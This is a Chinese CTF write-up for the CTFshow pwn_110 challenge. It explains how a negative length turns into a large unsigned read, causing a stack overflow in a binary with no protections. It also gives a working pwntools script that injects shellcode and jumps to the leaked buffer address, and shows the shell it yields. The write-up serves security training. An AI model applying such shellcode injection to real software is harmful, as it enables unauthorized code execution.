# CTFshow-pwn_110
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数安全（整数溢出 + 栈溢出）
## 解题思路
> 负数作为无符号处理 + shellcode 注入

无保护
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_110
[*] '/home/mrw/CTFshow/pwn_110'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

程序在主函数中调用 `input()` ，由于负数作无符号整数处理造成溢出问题
```c
unsigned __int16 *input()
{
  __int16 v1; // [esp+Ah] [ebp-41Eh] BYREF
  _BYTE buf[1025]; // [esp+Dh] [ebp-41Bh] BYREF
  unsigned __int16 v3; // [esp+40Eh] [ebp-1Ah] BYREF

  *(_DWORD *)buf = 0x3F3F3F;
  *(_DWORD *)&buf[4] = 0;
  *(_DWORD *)&buf[1021] = 0;
  memset(&buf[7], 0, 4 * (((&buf[4] - &buf[7] + 1021) & 0xFFFFFFFC) >> 2));
  __isoc99_scanf("%hd", &v1);
  if ( v1 > 1024 )
  {
    puts("You are soooooooooo ******");
    exit(0);
  }
  v3 = v1;
  printf("%x %u\n", buf, (unsigned __int16)v1);
  read(0, buf, v3);
  qmemcpy(str, buf, 0x400u);
  str[1024] = buf[1024];
  return &v3;
}
```

程序未开启栈上的 NX 保护，且泄露 buf 地址，可以注入 shellcode，同时利用负数转换产生的栈溢出劫持程序到 shellcode 上提权  
**exp 如下**  
```python
from pwn import *
context(arch = 'i386')
p = process('./pwn_110')
gdb.attach(p)
p.sendline(b'-1')
p.recvuntil(b'1+1= ?\n')
buf_addr = int(p.recvuntil(b' ')[:-1], 16)
sc = asm(shellcraft.sh())
payload = sc.ljust(0x41b+4, b'a') + p32(buf_addr)
p.send(payload)
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python ./exp/pwn_110.py
[+] Starting local process './pwn_110': pid 24861
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_110', '-p', '24861']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
65535
$ ls /
bin		   dev	 lib.usr-is-merged  media  run		       swap.img
bin.usr-is-merged  etc	 lib32		    mnt    sbin		       sys
boot		   flag  lib64		    opt    sbin.usr-is-merged  tmp
cdrom		   home  libx32		    proc   snap		       usr
ctfshow_flag	   lib	 lost+found	    root   srv		       var
$ cat /ctfshow_flag
flag{Success!}
$  
```